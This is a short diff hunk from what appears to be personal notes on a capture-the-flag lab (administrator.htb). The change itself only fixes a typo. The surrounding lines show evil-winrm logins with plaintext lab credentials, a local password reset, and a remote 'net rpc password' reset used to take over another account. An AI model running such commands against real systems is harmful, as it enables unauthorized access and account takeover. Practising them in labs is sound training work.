@@ -5,7 +5,7 @@ evil-winrm -i 10.10.11.42 -u 'Olivia' -p 'ichliebedich'
 net users
 net user michael Password123
 
-net tab:-
+new tab:-
 evil-winrm -i 10.10.11.42 -u 'michael' -p 'Password123'
 net rpc password "benjamin" "Batman@123" -U "administrator.htb"/"michael"%"Password123" -S "administrator.htb"
 
